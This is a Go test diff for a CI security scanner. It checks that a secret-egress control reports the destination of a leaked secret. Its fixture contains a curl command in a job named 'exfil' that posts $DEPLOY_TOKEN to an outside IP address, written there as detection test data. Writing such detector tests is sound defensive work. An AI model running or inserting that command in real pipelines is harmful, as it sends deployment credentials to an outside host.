@@ -4,6 +4,7 @@ import (
 	"testing"
 
 	"github.com/getplumber/plumber/control"
+	"github.com/getplumber/plumber/gitlab"
 	opaengine "github.com/getplumber/plumber/internal/engine/opa"
 )
 
@@ -290,5 +291,73 @@ func TestMRSettingsJSONBlock(t *testing.T) {
 	cleanName, cleanBlock := buildLegacyResult(entry, result, nil, nil)
 	if cleanName != "mrSettingsResult" || cleanBlock == nil {
 		t.Fatalf("clean run: name=%q block=%v, want mrSettingsResult with a non-nil block", cleanName, cleanBlock)
+	}
+}
+
+// TestSecretEgressJSONBlock locks the results.json detail block for the
+// GitLab secret-egress control (ISSUE-311): the dispatch must route it to
+// secretEgressResult and the per-finding destination must survive into the
+// issue entry, so a consumer can see WHERE the secret went, not just that
+// the control failed.
+func TestSecretEgressJSONBlock(t *testing.T) {
+	entry := control.ControlEntry{
+		DisplayName: "Pipeline must not send secrets to untrusted hosts",
+		ControlName: "pipelineMustNotSendSecretsToUntrustedHosts",
+	}
+	findings := []opaengine.Finding{{
+		Code:    "ISSUE-311",
+		Job:     "exfil",
+		Message: "Job `exfil` sends the secret `DEPLOY_TOKEN` to `193.32.204.199`.",
+		Data: map[string]any{
+			"destination": "193.32.204.199",
+			"secretNames": []any{"DEPLOY_TOKEN"},
+			"scriptLine":  "curl -d \"t=$DEPLOY_TOKEN\" http://193.32.204.199",
+		},
+	}}
+
+	// Three script lines as _countScriptLines counts them: two script
+	// entries and one before_script string.
+	result := &control.AnalysisResult{PipelineImageData: &gitlab.GitlabPipelineImageData{
+		MergedConf: &gitlab.GitlabCIConf{GitlabJobs: map[string]interface{}{
+			"exfil": map[string]interface{}{
+				"script":        []interface{}{"echo a", "curl -d \"t=$DEPLOY_TOKEN\" http://193.32.204.199"},
+				"before_script": "echo b",
+			},
+		}},
+	}}
+	if got := _countScriptLines(result); got != 3 {
+		t.Fatalf("_countScriptLines = %d, want 3: the fixture no longer pins the metric", got)
+	}
+
+	name, block := buildLegacyResult(entry, result, nil, findings)
+	if name != "secretEgressResult" {
+		t.Fatalf("block name = %q, want secretEgressResult (dispatch dropped the block)", name)
+	}
+	m, ok := block.(map[string]any)
+	if !ok {
+		t.Fatalf("block is %T, want map[string]any", block)
+	}
+	metrics, ok := m["metrics"].(map[string]any)
+	if !ok {
+		t.Fatalf("metrics is %T, want map[string]any", m["metrics"])
+	}
+	if metrics["secretsSentToUntrustedHosts"] != 1 {
+		t.Errorf("secretsSentToUntrustedHosts = %v, want 1", metrics["secretsSentToUntrustedHosts"])
+	}
+	if metrics["totalScriptLinesChecked"] != 3 {
+		t.Errorf("totalScriptLinesChecked = %v, want 3 (the merged config's script lines)", metrics["totalScriptLinesChecked"])
+	}
+	issues, ok := m["issues"].([]map[string]any)
+	if !ok || len(issues) != 1 {
+		t.Fatalf("issues = %v, want exactly 1 entry", m["issues"])
+	}
+	if issues[0]["destination"] != "193.32.204.199" {
+		t.Errorf("issue destination = %v, want 193.32.204.199", issues[0]["destination"])
+	}
+
+	// A clean run must still emit the block, with an empty issues list.
+	cleanName, cleanBlock := buildLegacyResult(entry, &control.AnalysisResult{}, nil, nil)
+	if cleanName != "secretEgressResult" || cleanBlock == nil {
+		t.Fatalf("clean run: name=%q block=%v, want secretEgressResult with a non-nil block", cleanName, cleanBlock)
 	}
 }
